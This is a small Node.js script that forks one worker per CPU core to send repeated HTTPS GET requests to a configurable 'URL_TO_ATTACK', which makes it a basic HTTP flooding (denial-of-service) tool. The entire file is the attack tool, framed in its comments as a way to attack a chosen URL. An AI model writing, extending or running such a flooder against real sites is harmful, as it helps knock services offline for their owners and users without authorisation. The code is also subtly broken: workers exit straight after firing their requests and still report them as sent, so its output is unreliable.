const os = require("os");
const cluster = require("cluster");
let numWorkers = os.cpus().length;
const https = require("https");

const numOfRequests = 100; // Number of HTTP/HTTPS requests you want to make
const URL_TO_ATTACK = ""; // The url you want to attack
const makeHttpRequest = () => {
  https
    .get(URL_TO_ATTACK, (resp) => {
      let data = "";

      // A chunk of data has been received.
      resp.on("data", (chunk) => {
        data += chunk;
      });

      // The whole response has been received. Print out the result.
      resp.on("end", () => {
        console.log(data);
      });
    })
    .on("error", (err) => {
      console.log("Error: " + err.message);
    });
};

if (cluster.isPrimary) {
  console.log("Master cluster setting up " + numWorkers + " workers...");

  for (var i = 0; i < numWorkers; i++) {
    cluster.fork();
  }

  cluster.on("online", function (worker) {
    console.log("Worker " + worker.process.pid + " is online");
  });

  cluster.on("exit", function (worker, code, signal) {
    console.log(
      "Worker " +
        worker.process.pid +
        " have sent " +
        Math.ceil(numOfRequests / numWorkers) +
        " requests."
    );
  });
} else {
  for (let i = 0; i < Math.ceil(numOfRequests / numWorkers); i++) {
    makeHttpRequest();
  }
  process.exit(1);
}
